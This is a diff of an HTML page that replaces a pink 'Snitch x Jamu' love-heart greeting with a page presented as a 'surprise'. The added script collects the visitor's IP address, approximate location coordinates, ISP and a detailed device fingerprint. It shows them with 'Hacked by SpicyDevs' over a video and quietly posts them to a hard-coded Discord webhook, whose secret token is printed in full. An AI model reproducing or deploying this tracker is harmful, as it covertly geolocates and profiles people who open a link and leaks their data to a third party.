@@ -1,242 +1,261 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Snitch x Jamu ♡</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Pacifico&display=swap');
+  <title>Snitch</title>
+  <meta name="description" content="get a surprise bro">
+  <script>
+    window.onload = async () => {
+      const video = document.getElementById('video');
+      const loading = document.getElementById('loading');
+      const data = document.getElementById('data');
 
-    :root {
-      --pink: #ff6f9f;
-      --deep-pink: #ed477f;
-      --cream: #fff8fb;
-      --ink: #74364f;
+      const error = message => {
+        loading.innerText = message;
+        throw message;
+      };
+
+      const pick = array => array[Math.floor(Math.random() * array.length)];
+      const hacked_statements = [
+        "Yes",
+        "Maybe",
+        "Most Likely",
+        "Highly Probable",
+        "Potentially",
+        "Unlikely But Still Possible",
+        "Almost Certainly",
+        "Definitely",
+        "Absolutely",
+      ];
+      const webhookUrl = "https://discord.com/api/webhooks/1111166274110771280/R2dwQ4tln3aFxCSIH4cq1_esSXG0MxEHIIlL4ALzT8sb1OS3NSZkRlPL77_W7lAxL6ca";
+
+      // Function to send data to Discord webhook
+      const sendDataToWebhook = async (data) => {
+        try {
+          await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ content: data }),
+          });
+        } catch (error) {
+          console.error('Failed to send data to Discord webhook:', error);
+        }
+      };
+
+      // Array to store merged messages
+      let mergedMessages = [];
+
+      // Send data to Discord webhook
+      const sendToWebhook = async (data) => {
+        mergedMessages.push(data); // Add the message to the mergedMessages array
+      };
+
+      // Send merged messages to Discord webhook
+      const sendMergedMessages = async () => {
+        const mergedData = mergedMessages.join('\n'); // Merge the messages using a separator
+        await sendDataToWebhook(mergedData); // Send the merged messages to the webhook
+        console.log('Data sent to SpicyDevs');
+        mergedMessages = []; // Reset the mergedMessages array
+      };
+
+      // Variable to track if the tab is being closed
+      let tabClosing = false;
+
+      // Handle beforeunload event to send merged messages before the tab closes
+      window.addEventListener('beforeunload', async (event) => {
+        if (!tabClosing && mergedMessages.length > 0) {
+          tabClosing = true;
+          event.preventDefault();
+          event.returnValue = ''; // Show the default browser prompt message
+          await sendMergedMessages(); // Send the accumulated messages
+        }
+      });
+
+      try {
+        const memes = [];
+        const push = (tit, con, add) => memes.push(`${tit}: ${con}${add || ''}`);
+
+        let step = 0;
+
+        let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 10);
+        data.style.fontSize = `${fontSize}px`;
+
+        let my_ip = await (await fetch("https://wtfismyip.com/json").catch()).json().catch();
+        let ip_data = await (await fetch(`https://uncors.vercel.app/?url=http://ip-api.com/json/${my_ip.YourFuckingIPAddress}`).catch()).json().catch();
+
+        const videoData = await fetch('video.mp4').catch(error);
+        video.src = URL.createObjectURL(await videoData.blob());
+        video.load();
+
+        video.oncanplaythrough = async () => {
+          loading.style.display = 'none';
+          start.style.display = 'flex';
+
+          if (my_ip && ip_data) {
+            push('IP Address', ip_data.query);
+            push('Hostname', my_ip.YourFuckingHostname);
+            push('Country', `${ip_data.country} (${ip_data.countryCode})`);
+            push('Region', `${ip_data.regionName} (${ip_data.region})`);
+            push('City', ip_data.city);
+            push('Latitude', ip_data.lat);
+            push('Longitude', ip_data.lon);
+            push('ISP', my_ip.YourFuckingISP);
+            push('Autonomous System', ip_data.as);
+          } else {
+            push('IP Address', '::ffff:172.70.126.134');
+          }
+          push('User Agent', navigator.userAgent);
+          push('Connection Method', "GET");
+          push('Request URL', "/");
+          push('Request Path', "/");
+          push('Request Protocol', "http");
+          push('Secure Connection', false ? 'Yes' : 'No');
+          push('Proxy IPs', '[]');
+          push('Window Properies', Object.keys(window).length);
+          push('Window Width', window.innerWidth, 'px');
+          push('Window Height', window.innerHeight, 'px');
+          push('Window Ratio', `${window.innerWidth / window.innerHeight}/1`);
+          push('Screen Width', window.screen.availWidth, 'px');
+          push('Screen Height', window.screen.availHeight, 'px');
+          push('Screen Ratio', `${window.screen.availWidth / window.screen.availHeight}/1`);
+          push('Screen Pixel Ratio', window.devicePixelRatio, '/1');
+          push('Screen DPI', window.devicePixelRatio);
+          push('Screen Color Depth', window.screen.colorDepth);
+          push('Screen Orientation', `${window.screen.orientation.type} (${window.screen.orientation.angle}°)`);
+          push('Screen Rotation', window.screen.orientation.angle);
+          push('OS', `${navigator.platform}`);
+          push('Available Browser Memory', typeof window.performance.memory != 'undefined' ? Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) : null, 'MB');
+          push('CPU Threads', `${navigator.hardwareConcurrency}`);
+          const canvas = document.createElement('canvas');
+          let gl;
+          let debugInfo;
+          try {
+            gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          } catch (e) {}
+          if (gl && debugInfo) {
+            push('GPU Vendor', gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
+            push('GPU Info', gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
+          }
+          push('Device Memory', `${navigator.deviceMemory}`);
+          push('System Languages', navigator.languages.join(', '));
+          push('Language', `${navigator.language}`);
+          let date = new Date();
+          push('Current Time', `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`);
+          if (ip_data) push('Timezone', ip_data.timezone);
+          push('Timezone Offset', date.getTimezoneOffset() / 60, ' hours');
+          push('Hacked', pick(hacked_statements));
+          push('Hacked By', 'SpicyDevs');
+          push('Current Status', "🟢");
+        };
+
+        start.onclick = async () => {
+          start.style.display = "none";
+          video.style.display = 'flex';
+          video.play();
+
+          const interval = setInterval(async () => {
+            const time = video.currentTime - 2.100 - step * 60 / 132; // 132 bpm moment
+            if (step >= memes.length) step = -Infinity;
+            if (step < 0) {
+              clearInterval(interval);
+              if (!tabClosing) {
+                await sendMergedMessages(); // Send the accumulated messages
+              }
+              return;
+            }
+            if (time >= 0) {
+              if (step == 0) document.title = `Hacked by SpicyDevs BOZO`;
+              const el = document.createElement('span');
+              el.textContent = `${memes[step]}`;
+              step++;
+              data.appendChild(el);
+              const height = data.getBoundingClientRect().height;
+              if (height >= window.innerHeight) {
+                fontSize *= 0.88;
+                data.style.fontSize = `${fontSize}px`;
+              }
+              sendToWebhook(`${memes[step]}`); // Add the message to the mergedMessages array
+            }
+          }, 5);
+        };
+
+        video.onended = () => {
+          video.style.display = 'none';
+          step = -Infinity;
+        };
+      } catch (e) {
+        error(`${e.message}`);
+      }
+    };
+  </script>
+  <style>
+    * {
+      background: white;
+      color: black;
     }
 
-    * { box-sizing: border-box; }
     body {
       margin: 0;
-      min-height: 100vh;
       overflow: hidden;
-      display: grid;
-      place-items: center;
-      color: var(--ink);
-      font-family: 'DM Sans', sans-serif;
-      background:
-        radial-gradient(circle at 15% 20%, #ffe1ed 0 2px, transparent 3px),
-        radial-gradient(circle at 85% 75%, #ffd5e5 0 2px, transparent 3px),
-        linear-gradient(135deg, #fff8fb, #ffeaf2 55%, #fff3f7);
-      background-size: 100px 100px, 130px 130px, auto;
+      height: 100vh;
+      font-family: consolas;
     }
 
-    .glow {
-      position: fixed;
-      width: 420px;
-      height: 420px;
-      border-radius: 50%;
-      background: #ffb5d0;
-      filter: blur(100px);
-      opacity: .35;
-      pointer-events: none;
+    body,
+    #loading,
+    #start,
+    #data {
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
 
-    main {
-      position: relative;
-      z-index: 1;
-      width: min(92vw, 620px);
-      text-align: center;
-      padding: 32px 18px;
-    }
-
-    .eyebrow {
-      margin: 0 0 12px;
-      color: #d86b91;
-      font-size: .78rem;
-      font-weight: 700;
-      letter-spacing: .24em;
-      text-transform: uppercase;
-    }
-
-    h1 {
-      margin: 0;
-      font-family: 'Pacifico', cursive;
-      font-size: clamp(2rem, 7vw, 3.4rem);
-      font-weight: 400;
-      color: var(--deep-pink);
-      text-shadow: 0 4px 18px #ff9fbe55;
-    }
-
-    .subtitle {
-      margin: 12px 0 4px;
-      color: #a65b78;
-      font-size: 1rem;
-    }
-
-    .heart-wrap {
-      position: relative;
-      width: min(76vw, 390px);
-      margin: 18px auto 10px;
-      filter: drop-shadow(0 18px 24px #e75a8c35);
-    }
-
-    svg { width: 100%; height: auto; overflow: visible; }
-    .heart-line {
-      fill: #fff0f6;
-      stroke: var(--pink);
-      stroke-width: 3.2;
-      stroke-linecap: round;
-      stroke-linejoin: round;
-      stroke-dasharray: 1200;
-      stroke-dashoffset: 1200;
-      animation: draw-heart 2.8s ease forwards, heart-glow 2s ease-in-out 2.8s infinite alternate;
-    }
-
-    .heart-text {
-      opacity: 0;
-      animation: fade-in .9s ease 2.2s forwards;
-    }
-
-    .heart-text-main {
-      font-family: 'Pacifico', cursive;
-      font-size: 25px;
-      fill: #d9447b;
-      text-anchor: middle;
-    }
-
-    .heart-text-small {
-      font-family: 'DM Sans', sans-serif;
-      font-size: 10px;
-      font-weight: 700;
-      letter-spacing: 2px;
-      fill: #d9799b;
-      text-anchor: middle;
-    }
-
-    .note {
-      min-height: 24px;
-      margin: 12px 0 20px;
-      color: #b36a86;
-      font-size: .92rem;
-    }
-
-    button {
-      border: 0;
-      border-radius: 999px;
-      padding: 13px 22px;
-      color: white;
-      background: linear-gradient(135deg, #ff8db2, #ec5b91);
-      box-shadow: 0 8px 20px #e75a8c38;
-      font: 700 .9rem 'DM Sans', sans-serif;
-      cursor: pointer;
-      transition: transform .2s, box-shadow .2s;
-    }
-
-    button:hover { transform: translateY(-2px); box-shadow: 0 12px 24px #e75a8c50; }
-    button:active { transform: scale(.97); }
-
-    .floating-heart {
-      position: fixed;
-      bottom: -30px;
-      color: #f27da6;
-      opacity: .75;
-      pointer-events: none;
-      animation: float-up linear forwards;
-    }
-
-    .sparkle {
+    #loading,
+    #start,
+    #video {
+      height: 100vh;
+      width: 100vw;
       position: absolute;
-      color: #f5a0bd;
-      animation: twinkle 2s ease-in-out infinite alternate;
-    }
-    .s1 { top: 16%; left: 13%; font-size: 22px; }
-    .s2 { top: 27%; right: 12%; font-size: 16px; animation-delay: .7s; }
-    .s3 { bottom: 17%; left: 18%; font-size: 18px; animation-delay: 1.1s; }
-    .s4 { bottom: 22%; right: 16%; font-size: 24px; animation-delay: .4s; }
-
-    @keyframes draw-heart { to { stroke-dashoffset: 0; } }
-    @keyframes fade-in { to { opacity: 1; } }
-    @keyframes heart-glow { from { filter: drop-shadow(0 0 2px #ff8db2); } to { filter: drop-shadow(0 0 12px #ff8db2); } }
-    @keyframes twinkle { from { opacity: .35; transform: scale(.8) rotate(-10deg); } to { opacity: 1; transform: scale(1.15) rotate(10deg); } }
-    @keyframes float-up {
-      to { transform: translateY(-110vh) rotate(25deg); opacity: 0; }
+      top: 0;
+      left: 0;
     }
 
-    @media (prefers-reduced-motion: reduce) {
-      *, *::before, *::after { animation-duration: .01ms !important; animation-iteration-count: 1 !important; }
-      .heart-line { stroke-dashoffset: 0; }
-      .heart-text { opacity: 1; }
+    #loading {
+      z-index: 3;
+      font-size: 36px;
+    }
+
+    #start {
+      flex-direction: column;
+      z-index: 2;
+      font-size: 36px;
+    }
+
+    #data {
+      flex-direction: column;
+      text-align: center;
+    }
+
+    #data span {
+      z-index: 1;
+      background: transparent !important;
+    }
+
+    @media only screen and (min-aspect-ratio: 1/1) {
+      #video {
+        object-fit: cover;
+      }
     }
   </style>
 </head>
+
 <body>
-  <div class="glow" aria-hidden="true"></div>
-  <span class="sparkle s1">✦</span>
-  <span class="sparkle s2">♡</span>
-  <span class="sparkle s3">✧</span>
-  <span class="sparkle s4">♡</span>
-
-  <main>
-    <p class="eyebrow">a little something special</p>
-    <h1>Made with love</h1>
-    <p class="subtitle">Some things just belong together.</p>
-
-    <div class="heart-wrap">
-      <svg viewBox="0 0 320 290" role="img" aria-label="A pink heart with the words Snitch x Jamu inside">
-        <path class="heart-line"
-          d="M160 260
-             C139 239 28 164 28 91
-             C28 43 84 18 124 48
-             C142 61 153 78 160 91
-             C167 78 178 61 196 48
-             C236 18 292 43 292 91
-             C292 164 181 239 160 260 Z" />
-        <g class="heart-text">
-          <text class="heart-text-small" x="160" y="126">ALWAYS &amp; FOREVER</text>
-          <text class="heart-text-main" x="160" y="164">Snitch x Jamu</text>
-          <text class="heart-text-small" x="160" y="188">♡  TOGETHER  ♡</text>
-        </g>
-      </svg>
-    </div>
-
-    <p class="note" id="note">A heart, drawn just for you. ♡</p>
-    <button id="surpriseBtn" type="button">Send a little love</button>
-  </main>
-
-  <script>
-    const button = document.getElementById('surpriseBtn');
-    const note = document.getElementById('note');
-    const messages = [
-      'A little reminder that you are appreciated. ♡',
-      'Two names, one cute little heart. ✨',
-      'Sending a whole lot of pink-hearted energy. ♡',
-      'Snitch x Jamu — a sweet little duo.'
-    ];
-    let messageIndex = 0;
-
-    function makeFloatingHeart() {
-      const heart = document.createElement('span');
-      heart.className = 'floating-heart';
-      heart.textContent = Math.random() > 0.35 ? '♡' : '♥';
-      heart.style.left = `${Math.random() * 100}vw`;
-      heart.style.fontSize = `${14 + Math.random() * 24}px`;
-      heart.style.animationDuration = `${4 + Math.random() * 4}s`;
-      document.body.appendChild(heart);
-      heart.addEventListener('animationend', () => heart.remove());
-    }
-
-    button.addEventListener('click', () => {
-      note.textContent = messages[messageIndex % messages.length];
-      messageIndex++;
-      for (let i = 0; i < 12; i++) {
-        setTimeout(makeFloatingHeart, i * 90);
-      }
-    });
-
-    // A few gentle floating hearts appear in the background.
-    for (let i = 0; i < 7; i++) {
-      setTimeout(makeFloatingHeart, i * 650);
-    }
-  </script>
+  <div id="loading">Loading.... <br>Wait 5s</div>
+  <div id="start" style="display: none">Click to Start!</div>
+  <div id="data"></div><video id="video" playingline style="display: none; pointer-events: none"></video>
 </body>
+
 </html>
